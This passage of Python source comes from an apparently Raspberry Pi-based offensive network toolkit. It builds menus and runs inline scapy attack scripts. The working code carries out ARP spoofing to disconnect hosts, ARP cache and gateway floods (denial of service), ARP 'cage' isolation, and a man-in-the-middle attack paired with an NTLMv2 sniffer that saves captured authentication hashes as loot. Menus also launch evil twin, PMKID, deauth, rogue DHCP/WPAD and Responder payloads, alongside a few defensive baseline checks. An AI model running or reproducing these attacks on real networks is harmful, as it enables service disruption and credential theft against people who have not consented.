    "Purple Team":      "\uf3ed",   # fa-shield-alt
    "Payloads":         "\uf0e7",   # fa-bolt
    "Loot":             "\uf07c",   # fa-folder-open
    "Stealth":          "\uf070",   # fa-eye-slash
    "System":           "\uf013",   # fa-cog
    # ── Payload categories ────────────────────────────────────────────────
    "Recon":            "\uf002",   # fa-search
    "Intercept":        "\uf0ec",   # fa-exchange
    "DoS":              "\uf0e7",   # fa-bolt
    "WiFi":             "\uf1eb",   # fa-wifi
    "Bluetooth":        "\uf294",   # fa-bluetooth-b
    "Credentials":      "\uf084",   # fa-key
    "Evasion":          "\uf070",   # fa-eye-slash
    "Hardware":         "\uf2db",   # fa-microchip
    "USB":              "\uf287",   # fa-usb
    "Social Eng":       "\uf007",   # fa-user
    "Exfiltrate":       "\uf019",   # fa-download
    "Remote":           "\uf233",   # fa-server
    "Evil Portal":      "\uf0ac",   # fa-globe
    "Utilities":        "\uf0ad",   # fa-wrench
    "Games":            "\uf11b",   # fa-gamepad
    "General":          "\uf013",   # fa-cog
    "Examples":         "\uf121",   # fa-code
    # ── Network submenu ───────────────────────────────────────────────────
    "Scan Network":     "\uf002",
    "Show Hosts":       "\uf0c0",   # fa-users
    "Ping Gateway":     "\uf492",   # fa-satellite
    "Network Info":     "\uf129",   # fa-info
    "ARP Watch":        "\uf06e",   # fa-eye
    # ── Offensive submenu ─────────────────────────────────────────────────
    "Kick ONE off":     "\uf05e",   # fa-ban
    "Kick ALL off":     "\uf1f8",   # fa-trash
    "ARP MITM":         "\uf0ec",
    "ARP Flood":        "\uf0e7",
    "Gateway DoS":      "\uf54c",
    "ARP Cage":         "\uf023",   # fa-lock
    "NTLMv2 Capture":   "\uf084",
    # ── WiFi submenu ──────────────────────────────────────────────────────
    "Enable Monitor":   "\uf0e7",
    "Disable Monitor":  "\uf070",
    "WiFi Scan":        "\uf002",
    "Deauth AP":        "\uf1d8",   # fa-paper-plane
    "Handshake Cap":    "\uf0a3",   # fa-certificate
    "PMKID Attack":     "\uf084",
    "Evil Twin AP":     "\uf1eb",
    "Select Adapter":   "\uf233",
    # ── MITM submenu ──────────────────────────────────────────────────────
    "Start MITM Suite": "\uf0ec",
    "DNS Spoofing ON":  "\uf0ac",
    "DNS Spoofing OFF": "\uf070",
    "Rogue DHCP/WPAD":  "\uf233",
    "Silent Bridge":    "\uf6ff",
    # ── Responder submenu ─────────────────────────────────────────────────
    "Responder ON":     "\uf382",
    "Responder OFF":    "\uf070",
    "Responder Logs":   "\uf15c",   # fa-file-alt
    # ── Purple Team submenu ───────────────────────────────────────────────
    "ARP Hardening":    "\uf3ed",
    "Disable LLMNR":    "\uf070",
    "SMB Signing":      "\uf023",
    "Encrypted DNS":    "\uf0ac",
    "Cleartext Audit":  "\uf002",
    "Export Baseline":  "\uf019",
    "Verify Baseline":  "\uf00c",   # fa-check
    "Defense Report":   "\uf15c",
    # ── System submenu ────────────────────────────────────────────────────
    "WebUI Status":     "\uf0e0",   # fa-envelope
    "Refresh State":    "\uf021",   # fa-sync
    "System Info":      "\uf129",
    "Discord Status":   "\uf392",   # fa-discord
    "Reboot":           "\uf2f9",   # fa-redo
    "Shutdown":         "\uf011",   # fa-power-off
    # ── Universal ─────────────────────────────────────────────────────────
    "Back":             "\uf060",   # fa-arrow-left
    "Home":             "\uf015",   # fa-home
}


def _icon_for(label: str) -> str:
    """Return the FontAwesome glyph for *label*, or '' when unknown / no font."""
    if not icon_font:
        return ""
    bare = label.strip()
    if bare in _FA_ICONS:
        return _FA_ICONS[bare]
    # Strip trailing payload count like " Games (13)" → "Games"
    if " (" in bare:
        key = bare[: bare.index(" (")]
        if key in _FA_ICONS:
            return _FA_ICONS[key]
    return ""


def _list_payloads(category):
    cat_dir = Path(default.payload_path) / category
    if not cat_dir.exists(): return []
    result = []
    for f in sorted(cat_dir.glob("*.py")):
        if f.name.startswith("_"): continue
        name = f.stem.replace("_"," ").title()
        try:
            for line in f.read_text(errors="ignore").splitlines()[:10]:
                if line.startswith("# NAME:"): name = line[7:].strip()
        except Exception:
            pass
        result.append((name, str(f)))
    return result

# ═══════════════════════════════════════════════════════════════════════════════
# ── Menu class ─────────────────────────────────────────────────────────────────
# ═══════════════════════════════════════════════════════════════════════════════

class KTOxMenu:
    which  = "home"
    select = 0

    def _menu(self):
        return {
        # ── HOME ──────────────────────────────────────────────────────────────
        "home": (
            (" Network",       "net"),
            (" Offensive",     "off"),
            (" WiFi Engine",   "wifi"),
            (" MITM & Spoof",  "mitm"),
            (" Responder",     "resp"),
            (" Purple Team",   "purple"),
            (" Payloads",      "pay"),
            (" Loot",          "loot"),
            (" Stealth",       enter_stealth),
            (" System",        "sys"),
        ),

        # ── NETWORK ───────────────────────────────────────────────────────────
        "net": (
            (" Scan Network",    do_network_scan),
            (" Show Hosts",      self._show_hosts),
            (" Ping Gateway",    self._ping_gw),
            (" Network Info",    self._net_info),
            (" ARP Watch",       do_arp_watch),
            (" Back",            "home"),
        ),

        # ── OFFENSIVE ─────────────────────────────────────────────────────────
        "off": (
            (" Kick ONE off",   self._kick_one),
            (" Kick ALL off",   self._kick_all),
            (" ARP MITM",       self._do_mitm),
            (" ARP Flood",      self._arp_flood),
            (" Gateway DoS",    self._gw_dos),
            (" ARP Cage",       self._arp_cage),
            (" NTLMv2 Capture", self._ntlm),
            (" Back",            "home"),
        ),

        # ── WiFi ENGINE ───────────────────────────────────────────────────────
        "wifi": (
            (" Enable Monitor",  do_wifi_monitor_on),
            (" Disable Monitor", do_wifi_monitor_off),
            (" WiFi Scan",       do_wifi_scan),
            (" Deauth AP",       do_deauth_targeted),
            (" Handshake Cap",   do_handshake_targeted),
            (" PMKID Attack",    self._pmkid),
            (" Evil Twin AP",    self._evil_twin),
            (" Select Adapter",  self._select_adapter),
        ),

        # ── MITM & SPOOF ──────────────────────────────────────────────────────
        "mitm": (
            (" Start MITM Suite",   do_start_mitm_suite),
            (" DNS Spoofing ON",    do_dns_spoofing),
            (" DNS Spoofing OFF",   do_dns_spoof_stop),
            (" Rogue DHCP/WPAD",    partial(exec_payload,"interception/rogue_dhcp_wpad")),
            (" Silent Bridge",      partial(exec_payload,"interception/silent_bridge")),
            (" Evil Portal",        partial(exec_payload,"evil_portal/honeypot")),
        ),

        # ── RESPONDER ─────────────────────────────────────────────────────────
        "resp": (
            (" Responder ON",     do_responder_on),
            (" Responder OFF",    do_responder_off),
            (" Read Hashes",      self._read_responder_logs),
        ),

        # ── PURPLE TEAM ───────────────────────────────────────────────────────
        "purple": (
            (" ARP Watch",        do_arp_watch),
            (" ARP Diff Live",    do_arp_diff),
            (" Rogue Detector",   do_rogue_detect),
            (" LLMNR Detector",   do_llmnr_detect),
            (" ARP Harden",       do_arp_harden),
            (" Baseline Export",  do_baseline_export),
            (" Verify Baseline",  self._verify_baseline),
            (" SMB Probe",        partial(exec_payload,"reconnaissance/smb_probe")),
        ),

        # ── PAYLOADS ──────────────────────────────────────────────────────────
        "pay":    self._build_payload_menu(),

        # ── LOOT — special ────────────────────────────────────────────────────
        "loot":   None,

        # ── SYSTEM ────────────────────────────────────────────────────────────
        "sys": (
            (" WebUI Status",    self._webui_status),
            (" Refresh State",   self._refresh),
            (" System Info",     self._sysinfo),
            (" OTA Update",      partial(exec_payload,"general/auto_update")),
            (" Discord Webhook", self._discord_status),
            (" Lock",            OpenLockMenu),
            (" Reboot",          self._reboot),
            (" Shutdown",        self._shutdown),
        ),
        }

    # ── Rendering ─────────────────────────────────────────────────────────────

    def GetMenuList(self):
        tree  = self._menu()
        items = tree.get(self.which, ())
        if items is None: return []
        return [item[0] for item in items]

    def render_current(self):
        RenderMenuWindowOnce(self.GetMenuList(), self.select)

    # ── Navigation ────────────────────────────────────────────────────────────

    def navigate(self, key):
        tree  = self._menu()

        if key == "loot":
            self._browse_loot()
            return

        items = tree.get(key)
        if not items:
            Dialog_info("Empty menu.", wait=True)
            return

        labels = [item[0] for item in items]
        sel    = 0
        WINDOW = 7

        while True:
            total  = len(labels)
            offset = max(0, min(sel-2, total-WINDOW))
            window = labels[offset:offset+WINDOW]

            with draw_lock:
                _draw_toolbar()
                color.DrawMenuBackground()
                color.DrawBorder()
                # ── Menu title strip ─────────────────────────────────────
                _titles = {
                    "home": "▐ KTOx_Pi ▌", "net":    "Network",
                    "off":  "Offensive",    "wifi":   "WiFi Engine",
                    "mitm": "MITM & Spoof", "resp":   "Responder",
                    "purple":"Purple Team", "sys":    "System",
                    "pay":  "Payloads",
                }
                _t = _titles.get(key, key.upper())
                draw.rectangle([3, 13, 125, 24], fill="#1a0000")
                _centered(_t[:18], 13, font=small_font, fill=color.border)
                draw.line([(3, 24), (125, 24)], fill=color.border, width=1)
                _ST = 26   # items start-y
                _RH = 13   # row height
                for i, label in enumerate(window):
                    is_sel = (i == sel - offset)
                    row_y  = _ST + _RH * i
                    if is_sel:
                        draw.rectangle([3, row_y, 124, row_y + 12],
                                       fill=color.select)
                    fill = color.selected_text if is_sel else color.text
                    icon = _icon_for(label)
                    if icon:
                        draw.text((5,  row_y + 1), icon, font=icon_font, fill=fill)
                        t = _truncate(label.strip(), 92)
                        draw.text((23, row_y + 1), t,    font=text_font, fill=fill)
                    else:
                        t = _truncate(label.strip(), 108)
                        draw.text((6,  row_y + 1), t,    font=text_font, fill=fill)
                # ── Scroll pip ───────────────────────────────────────────
                if len(labels) > WINDOW:
                    avail = _RH * WINDOW
                    pip_h = max(6, int(WINDOW / len(labels) * avail))
                    pip_y = _ST + int(offset / max(1, len(labels) - WINDOW) * (avail - pip_h))
                    draw.rectangle([125, pip_y, 127, pip_y + pip_h],
                                   fill=color.border)

            time.sleep(0.08)
            btn = getButton(timeout=0.5)

            if btn is None:                                continue
            elif btn == "KEY_DOWN_PIN":                    sel = (sel + 1) % len(labels)
            elif btn == "KEY_UP_PIN":                      sel = (sel - 1) % len(labels)
            elif btn in ("KEY_PRESS_PIN", "KEY_RIGHT_PIN"):
                self.select = sel
                action = items[sel][1]
                if isinstance(action, str):
                    saved = self.which
                    self.which = action
                    self.navigate(action)
                    self.which = saved
                elif callable(action):
                    action()
            elif btn in ("KEY_LEFT_PIN", "KEY1_PIN"):      return
            elif btn == "KEY2_PIN":
                self.which = "home"
                return
            elif btn == "KEY3_PIN":
                if ktox_state.get("running"):
                    ktox_state["running"] = None
                    Dialog_info("Stopped.", wait=False, timeout=1)

    
    def _nav_scan(self):
        exec_payload("Navarro/navarro_scan.py")
    def _nav_ports(self):
        exec_payload("Navarro/navarro_ports.py")
    def _nav_reports(self):
        self._browse_dir(KTOX_DIR + "/Navarro/reports", "Navarro Reports")

    def home_loop(self):
        while True:
            req = _check_payload_request()
            if req:
                exec_payload(req)
                continue
            self.navigate("home")

    # ── Network actions ───────────────────────────────────────────────────────

    def _show_hosts(self):
        hosts = ktox_state["hosts"]
        if not hosts:
            Dialog_info("No hosts.\nRun scan first.", wait=True)
            return

        # Build display lines
        lines = []
        for h in hosts:
            ip  = h.get("ip",  "?") if isinstance(h, dict) else (h[0] if len(h) > 0 else "?")
            mac = h.get("mac", "")   if isinstance(h, dict) else (h[1] if len(h) > 1 else "")
            lines.append(f"{ip}  {mac[:8]}".strip())
        if not lines:
            Dialog_info("No hosts found.", wait=True)
            return

        WINDOW = 6
        total  = len(lines)
        sel    = 0

        while True:
            offset = max(0, min(sel-2, total-WINDOW))
            window = lines[offset:offset+WINDOW]

            with draw_lock:
                _draw_toolbar()
                draw.rectangle([0,12,128,128], fill=color.background)
                color.DrawBorder()
                # Title
                draw.rectangle([3,13,125,24], fill="#1a0000")
                _centered(f"Hosts ({total})", 13, font=small_font, fill=color.border)
                draw.line([3,24,125,24], fill=color.border, width=1)
                # Rows
                for i, txt in enumerate(window):
                    row_y = 26 + 13*i
                    is_sel = (i == sel-offset)
                    if is_sel:
                        draw.rectangle([3, row_y, 124, row_y+12], fill=color.select)
                    draw.text((5, row_y+1), txt[:22], font=small_font,
                              fill=color.selected_text if is_sel else color.text)
                # Footer hint
                draw.line([3,112,125,112], fill="#2a0505", width=1)
                _centered("LEFT=back  CTR=exit", 114, font=small_font, fill="#4a2020")

            time.sleep(0.08)
            btn = getButton(timeout=0.5)
            if   btn is None:                                  continue
            elif btn == "KEY_DOWN_PIN":                        sel = (sel+1) % total
            elif btn == "KEY_UP_PIN":                         sel = (sel-1) % total
            elif btn in ("KEY_LEFT_PIN","KEY1_PIN","KEY2_PIN",
                         "KEY3_PIN","KEY_PRESS_PIN",
                         "KEY_RIGHT_PIN"):                     return

    def _ping_gw(self):
        gw = ktox_state["gateway"]
        if not gw:
            Dialog_info("No gateway!", wait=True)
            return
        rc, out = _run(["ping","-c","4","-W","1",gw], timeout=10)
        lines = [f" GW: {gw}"] + [f" {l}" for l in out.splitlines()[-4:]]
        GetMenuString(lines)

    def _net_info(self):
        ip  = get_ip()
        gw  = ktox_state["gateway"]
        ifc = ktox_state["iface"]
        GetMenuString([
            f" IP:    {ip}",
            f" GW:    {gw}",
            f" IF:    {ifc}",
            f" WiFi:  {ktox_state['wifi_iface']}",
            f" Mon:   {ktox_state.get('mon_iface','off')}",
            f" Hosts: {len(ktox_state['hosts'])}",
            f" Loot:  {loot_count()} files",
        ])

    # ── Offensive actions ──────────────────────────────────────────────────────

    def _kick_one(self):
        tgt = _pick_host()
        if not tgt:
            return
        pps = _ask_pps()
        if pps is None:
            return
        if YNDialog("KICK ONE", y="Yes", n="No", b=f"Kick {tgt}\n@ {pps} pkt/s?"):
            do_arp_kick(tgt, pps)

    def _kick_all(self):
        """Kick every non-gateway host discovered in the last scan."""
        gw     = ktox_state["gateway"]
        iface  = ktox_state["iface"]
        hosts  = [h["ip"] for h in ktox_state.get("hosts", [])
                  if h["ip"] != gw]
        if not hosts:
            Dialog_info("No hosts found.\nRun scan first.", wait=True)
            return
        pps = _ask_pps()
        if pps is None:
            return
        if not YNDialog("KICK ALL", y="Yes", n="No",
                        b=f"Kick {len(hosts)} hosts\n@ {pps} pkt/s?"):
            return

        Dialog_info("Resolving MACs…", wait=False, timeout=1)
        targets = [(ip, _scapy_resolve(ip, iface)) for ip in hosts]
        targets = [(ip, mac) for ip, mac in targets if mac]
        if not targets:
            Dialog_info("No MACs resolved.\nHosts offline?", wait=True)
            return

        gw_mac   = _scapy_resolve(gw, iface)
        interval = 1.0 / max(1, pps)
        t_list   = ";".join(f"('{ip}','{mac}')" for ip, mac in targets)

        script = (
            "import sys,time,logging,signal;"
            "logging.getLogger('scapy.runtime').setLevel(logging.ERROR);"
            "from scapy.all import Ether,ARP,sendp,get_if_hwaddr;"
            "signal.signal(signal.SIGTERM,lambda *_:sys.exit(0));"
            f"iface='{iface}';"
            f"my=get_if_hwaddr(iface);"
            f"g_ip='{gw}';g_mac='{gw_mac}';"
            f"iv={interval!r};"
            f"targets=[{t_list}];"
            "while True:"
            "  for t_ip,t_mac in targets:"
            "    sendp(Ether(src=my,dst=t_mac)/ARP(op=2,hwsrc=my,psrc=g_ip,hwdst=t_mac,pdst=t_ip),verbose=False,iface=iface);"
            "    g_mac and sendp(Ether(src=my,dst=g_mac)/ARP(op=2,hwsrc=my,psrc=t_ip,hwdst=g_mac,pdst=g_ip),verbose=False,iface=iface);"
            "    time.sleep(iv)"
        )
        proc = subprocess.Popen(["python3", "-c", script],
                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        ktox_state["running"] = f"KICK ALL {pps}/s"
        Dialog_info(f"KICK ALL\n{len(targets)} hosts\n{pps} pkt/s\nKEY3=stop", wait=True)
        proc.terminate()
        try:
            proc.wait(timeout=2)
        except Exception:
            proc.kill()
        ktox_state["running"] = None
        if gw_mac:
            for t_ip, t_mac in targets:
                _scapy_restore(t_ip, t_mac, gw, gw_mac, iface, "")
        Dialog_info("Kick ALL stopped.\nARP restored.", wait=False, timeout=1)

    def _do_mitm(self):
        tgt = _pick_host()
        if tgt and YNDialog("MITM", y="Yes", n="No", b=f"MITM {tgt}?"):
            do_mitm(tgt)

    def _arp_flood(self):
        """Real ARP cache flood: sends randomised ARP replies at high rate."""
        tgt   = _pick_host()
        iface = ktox_state["iface"]
        if not tgt:
            return
        pps = _ask_pps()
        if pps is None:
            return
        if not YNDialog("ARP FLOOD", y="Yes", n="No", b=f"Flood {tgt}\n@ {pps} pkt/s?"):
            return

        Dialog_info(f"Resolving MAC…\n{tgt}", wait=False, timeout=1)
        t_mac = _scapy_resolve(tgt, iface)
        if not t_mac:
            Dialog_info(f"MAC resolve\nfailed for\n{tgt}", wait=True)
            return

        interval = 1.0 / max(1, pps)
        script = (
            "import sys,time,random,logging,signal;"
            "logging.getLogger('scapy.runtime').setLevel(logging.ERROR);"
            "from scapy.all import Ether,ARP,sendp;"
            "signal.signal(signal.SIGTERM,lambda *_:sys.exit(0));"
            f"iface='{iface}';t_ip='{tgt}';t_mac='{t_mac}';iv={interval!r};"
            "while True:"
            "  fip='.'.join(str(random.randint(1,254)) for _ in range(4));"
            "  fmac=':'.join(f'{random.randint(0,255):02x}' for _ in range(6));"
            "  sendp(Ether(src=fmac,dst=t_mac)/ARP(op=2,hwsrc=fmac,psrc=fip,hwdst=t_mac,pdst=t_ip),verbose=False,iface=iface);"
            "  time.sleep(iv)"
        )
        proc = subprocess.Popen(["python3", "-c", script],
                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        ktox_state["running"] = f"ARP FLOOD {pps}/s"
        Dialog_info(f"ARP FLOOD\n{tgt}\n{pps} pkt/s\nrandom src\nKEY3=stop", wait=True)
        proc.terminate()
        try:
            proc.wait(timeout=2)
        except Exception:
            proc.kill()
        ktox_state["running"] = None
        Dialog_info("Flood stopped.", wait=False, timeout=1)

    def _gw_dos(self):
        """Flood gateway ARP table with random fake entries at configurable PPS."""
        gw    = ktox_state["gateway"]
        iface = ktox_state["iface"]
        if not gw:
            Dialog_info("No gateway!", wait=True)
            return
        pps = _ask_pps()
        if pps is None:
            return
        if not YNDialog("GW DoS", y="Yes", n="No", b=f"DoS {gw}\n@ {pps} pkt/s?"):
            return

        Dialog_info(f"Resolving GW MAC…\n{gw}", wait=False, timeout=1)
        gw_mac = _scapy_resolve(gw, iface)
        if not gw_mac:
            Dialog_info("GW MAC resolve\nfailed.", wait=True)
            return

        interval = 1.0 / max(1, pps)
        script = (
            "import sys,time,random,logging,signal;"
            "logging.getLogger('scapy.runtime').setLevel(logging.ERROR);"
            "from scapy.all import Ether,ARP,sendp;"
            "signal.signal(signal.SIGTERM,lambda *_:sys.exit(0));"
            f"iface='{iface}';g_ip='{gw}';g_mac='{gw_mac}';iv={interval!r};"
            "while True:"
            "  fip='.'.join(str(random.randint(1,254)) for _ in range(4));"
            "  fmac=':'.join(f'{random.randint(0,255):02x}' for _ in range(6));"
            "  sendp(Ether(src=fmac,dst=g_mac)/ARP(op=2,hwsrc=fmac,psrc=fip,hwdst=g_mac,pdst=g_ip),verbose=False,iface=iface);"
            "  time.sleep(iv)"
        )
        proc = subprocess.Popen(["python3", "-c", script],
                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        ktox_state["running"] = f"GW DoS {pps}/s"
        Dialog_info(f"GW DoS\n{gw}\n{pps} pkt/s\nKEY3=stop", wait=True)
        proc.terminate()
        try:
            proc.wait(timeout=2)
        except Exception:
            proc.kill()
        ktox_state["running"] = None
        Dialog_info("DoS stopped.", wait=False, timeout=1)

    def _arp_cage(self):
        """Isolate target from ALL peers: poisons target's view of every host."""
        tgt   = _pick_host()
        gw    = ktox_state["gateway"]
        iface = ktox_state["iface"]
        if not tgt or not gw:
            return
        peers = [h["ip"] for h in ktox_state.get("hosts", []) if h["ip"] != tgt]
        if not YNDialog("ARP CAGE", y="Yes", n="No",
                        b=f"Cage {tgt}\nfrom {len(peers)} peers?"):
            return

        Dialog_info(f"Resolving MACs…\n{tgt}", wait=False, timeout=1)
        t_mac    = _scapy_resolve(tgt, iface)
        gw_mac   = _scapy_resolve(gw, iface)
        if not t_mac:
            Dialog_info("Target MAC\nresolve failed.", wait=True)
            return

        # Resolve peer MACs (best effort)
        peer_macs = [(ip, _scapy_resolve(ip, iface)) for ip in peers]
        peer_macs = [(ip, mac) for ip, mac in peer_macs if mac]

        p_list = ";".join(f"('{ip}','{mac}')" for ip, mac in peer_macs)
        script = (
            "import sys,time,logging,signal;"
            "logging.getLogger('scapy.runtime').setLevel(logging.ERROR);"
            "from scapy.all import Ether,ARP,sendp,get_if_hwaddr;"
            "signal.signal(signal.SIGTERM,lambda *_:sys.exit(0));"
            f"iface='{iface}';"
            f"my=get_if_hwaddr(iface);"
            f"t_ip='{tgt}';t_mac='{t_mac}';"
            f"peers=[{p_list}];"
            "while True:"
            "  for p_ip,p_mac in peers:"
            "    sendp(Ether(src=my,dst=t_mac)/ARP(op=2,hwsrc=my,psrc=p_ip,hwdst=t_mac,pdst=t_ip),verbose=False,iface=iface);"
            "    time.sleep(0.05)"
        )
        proc = subprocess.Popen(["python3", "-c", script],
                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        ktox_state["running"] = "ARP CAGE"
        Dialog_info(
            f"Cage ACTIVE\n{tgt}\n{len(peer_macs)} peers faked\nKEY3=release",
            wait=True
        )
        proc.terminate()
        try:
            proc.wait(timeout=2)
        except Exception:
            proc.kill()
        ktox_state["running"] = None
        # Restore target's view of all peers
        if t_mac:
            for p_ip, p_mac in peer_macs:
                _scapy_restore(tgt, t_mac, p_ip, p_mac, iface, "")
        Dialog_info("Cage released.\nARP restored.", wait=False, timeout=1)

    def _ntlm(self):
        """MITM + NTLMv2 sniffer: poison target then capture auth hashes."""
        tgt   = _pick_host()
        iface = ktox_state["iface"]
        gw    = ktox_state["gateway"]
        if not tgt or not gw:
            return
        if not YNDialog("NTLMv2", y="Yes", n="No",
                        b=f"MITM+capture\n{tgt}?"):
            return

        Dialog_info(f"Resolving MACs…\n{tgt}", wait=False, timeout=1)
        t_mac  = _scapy_resolve(tgt, iface)
        gw_mac = _scapy_resolve(gw, iface)
        if not t_mac or not gw_mac:
            Dialog_info("MAC resolve\nfailed.", wait=True)
            return

        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
        loot_path = f"{LOOT_DIR}/ntlm_hashes.txt"

        # MITM subprocess
        mitm_script = (
            "import sys,time,logging,signal;"
            "logging.getLogger('scapy.runtime').setLevel(logging.ERROR);"
            "from scapy.all import Ether,ARP,sendp,get_if_hwaddr;"
            "signal.signal(signal.SIGTERM,lambda *_:sys.exit(0));"
            f"iface='{iface}';"
            f"my=get_if_hwaddr(iface);"
            f"t_ip='{tgt}';t_mac='{t_mac}';"
            f"g_ip='{gw}';g_mac='{gw_mac}';"
            "while True:"
            "  sendp(Ether(src=my,dst=t_mac)/ARP(op=2,hwsrc=my,psrc=g_ip,hwdst=t_mac,pdst=t_ip),verbose=False,iface=iface);"
            "  sendp(Ether(src=my,dst=g_mac)/ARP(op=2,hwsrc=my,psrc=t_ip,hwdst=g_mac,pdst=g_ip),verbose=False,iface=iface);"
            "  time.sleep(0.5)"
        )
        # NTLMv2 sniffer subprocess
        sniff_script = (
            "import sys,re,struct,logging,os;"
            "logging.getLogger('scapy.runtime').setLevel(logging.ERROR);"
            "from scapy.all import sniff,TCP,Raw,Ether,IP;"
            f"loot='{loot_path}';"
            "os.makedirs(os.path.dirname(loot),exist_ok=True);"
            "SIG=b'NTLMSSP\\x00';"
            "def handle(pkt):\n"
            "  if not pkt.haslayer(TCP) or not pkt.haslayer(Raw): return\n"
            "  raw=pkt[Raw].load\n"
            "  idx=raw.find(SIG)\n"
            "  if idx<0: return\n"
            "  blob=raw[idx:]\n"
            "  try:\n"
            "    mtype=struct.unpack_from('<I',blob,8)[0]\n"
            "    if mtype!=3: return\n"
            "    def f(blob,off): l,_,o=struct.unpack_from('<HHI',blob,off); return blob[o:o+l]\n"
            "    nt=f(blob,20); dom=f(blob,28); usr=f(blob,36)\n"
            "    h=f'{usr.decode(\"utf-16-le\",errors=\"replace\")}::{dom.decode(\"utf-16-le\",errors=\"replace\")}::'\\\n"
            "      +nt.hex()\n"
            "    print(f'NTLM HASH: {h}',flush=True)\n"
            "    open(loot,'a').write(h+'\\n')\n"
            "  except: pass\n"
            f"sniff(iface='{iface}',filter='tcp and (port 445 or port 80 or port 8080)',prn=handle,store=False)"
        )
        p_mitm  = subprocess.Popen(["python3", "-c", mitm_script],
                                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        p_sniff = subprocess.Popen(["python3", "-c", sniff_script],
                                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        ktox_state["running"] = "NTLMv2"
        Dialog_info(
            f"NTLMv2 CAPTURE\n{tgt}\nSMB+HTTP sniff\nKEY3=stop",
            wait=True
        )
        for p in (p_mitm, p_sniff):
            p.terminate()
            try: p.wait(timeout=2)
            except Exception: p.kill()
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        ktox_state["running"] = None
        _scapy_restore(tgt, t_mac, gw, gw_mac, iface, "")
        # Count captured hashes
        try:
            n = len(open(loot_path).readlines()) if os.path.exists(loot_path) else 0
        except Exception:
            n = 0
        Dialog_info(f"Capture stopped.\n{n} hash(es).\nLoot: ntlm_hashes.txt",
                    wait=False, timeout=2)

    # ── WiFi actions ──────────────────────────────────────────────────────────

    def _handshake(self):
        do_handshake_targeted()

    def _pmkid(self):
        mon = ktox_state.get("mon_iface")
        if not mon:
            Dialog_info("Enable monitor\nmode first.", wait=True)
            return
        exec_payload("wifi/pmkid_capture")

    def _evil_twin(self):
        exec_payload("wifi/evil_twin")

    def _select_adapter(self):
        rc, out = _run(["iw","dev"])
        import re
        ifaces = re.findall(r"Interface\s+(\w+)", out)
        if not ifaces:
            Dialog_info("No WiFi adapters!", wait=True)
            return
        sel = GetMenuString([f" {i}" for i in ifaces])
        if sel:
            ktox_state["wifi_iface"] = sel.strip()
            Dialog_info(f"Adapter:\n{sel.strip()}", wait=True)

    # ── Responder ─────────────────────────────────────────────────────────────

    def _read_responder_logs(self):
        log_dir = Path(f"{INSTALL_PATH}Responder/logs")
        if not log_dir.exists():
            Dialog_info("No Responder logs.", wait=True)
            return
        files = sorted(log_dir.glob("*.log"), reverse=True)[:10]
        if not files:
            Dialog_info("No log files yet.", wait=True)
            return
        sel = GetMenuString([f" {f.name[:22]}" for f in files])
        if not sel: return
        fname = sel.strip()
        match = [f for f in files if f.name == fname]
        if match:
            lines = match[0].read_text(errors="ignore").splitlines()
            GetMenuString([f" {l[:24]}" for l in lines[:50]])

    # ── Purple Team ───────────────────────────────────────────────────────────

    def _verify_baseline(self):
        baselines = sorted(Path(LOOT_DIR).glob("baseline_*.json"), reverse=True)
        if not baselines:
            Dialog_info("No baseline.\nExport one first.", wait=True)
            return
        try:
            data    = json.loads(baselines[0].read_text())
            known   = {h["mac"]:h["ip"] for h in data.get("hosts",[]) if h.get("mac")}
            current = ktox_state["hosts"]
            issues  = []
            for h in current:
                mac = h.get("mac",h[1]) if isinstance(h,dict) else (h[1] if len(h)>1 else "")
                ip  = h.get("ip",h[0])  if isinstance(h,dict) else h[0]
                if mac and mac not in known:     issues.append(f"! ROGUE {ip}")
                elif mac and known.get(mac) != ip: issues.append(f"! MOVED {mac[:11]}")
            if issues: GetMenuString(issues)
            else:      Dialog_info(f"✔ Clean!\n{len(current)} hosts match.", wait=True)
        except Exception as e:
            Dialog_info(f"Error:\n{str(e)[:28]}", wait=True)

    # ── Payloads ──────────────────────────────────────────────────────────────

    def _build_payload_menu(self):
        items = []
        for cat_key, cat_label in PAYLOAD_CATEGORIES:
            payloads = _list_payloads(cat_key)
            if payloads:
                items.append((f" {cat_label} ({len(payloads)})", f"pay_{cat_key}"))
        if not items:
            items = [(" No payloads found", lambda: Dialog_info(
                "Drop .py files into\n/root/KTOx/payloads\n/<category>/", wait=True))]
        # Also add the dynamic category submenus
        tree = self._get_payload_submenus()
        return tuple(items)

    def _get_payload_submenus(self):
        """Return a dict of pay_<cat> -> tuple of (label, callable) for navigate()."""
        subs = {}
        for cat_key, cat_label in PAYLOAD_CATEGORIES:
            payloads = _list_payloads(cat_key)
            if payloads:
                subs[f"pay_{cat_key}"] = tuple(
                    (f" {name}", partial(exec_payload, path))
                    for name, path in payloads
                )
        return subs

    # Override navigate to handle dynamic payload submenus
    def navigate(self, key):
        # Inject payload sub-menus into tree dynamically
        if key.startswith("pay_"):
            cat_key  = key[4:]
            payloads = _list_payloads(cat_key)
            if not payloads:
                Dialog_info("No payloads\nin this category.", wait=True)
                return
            items    = [(f" {name}", partial(exec_payload, path))
                        for name, path in payloads]
            labels   = [i[0] for i in items]
            sel      = 0
            WINDOW   = 7
            # Resolve display title for this category
            cat_title = next(
                (lbl for k, lbl in PAYLOAD_CATEGORIES if k == cat_key), cat_key.upper()
            )
            cat_icon  = _icon_for(cat_title)
            while True:
                total  = len(labels)
                offset = max(0, min(sel - 2, total - WINDOW))
                window = labels[offset:offset + WINDOW]
                _ST    = 26   # items start-y (below title strip)
                _RH    = 13   # row height
                with draw_lock:
                    _draw_toolbar()
                    color.DrawMenuBackground()
                    color.DrawBorder()
                    # ── Category title strip ──────────────────────────────
                    draw.rectangle([3, 13, 125, 24], fill="#1a0000")
                    _hdr = (cat_icon + " " if cat_icon else "") + cat_title
                    _centered(_hdr[:20], 13, font=small_font, fill=color.border)
                    draw.line([(3, 24), (125, 24)], fill=color.border, width=1)
                    # ── Items ─────────────────────────────────────────────
                    for i, label in enumerate(window):
                        is_sel = (i == sel - offset)
                        row_y  = _ST + _RH * i
                        if is_sel:
                            draw.rectangle([3, row_y, 124, row_y + 12],
                                           fill=color.select)
                        fill = color.selected_text if is_sel else color.text
                        icon = _icon_for(label)
                        if icon:
                            draw.text((5,  row_y + 1), icon, font=icon_font, fill=fill)
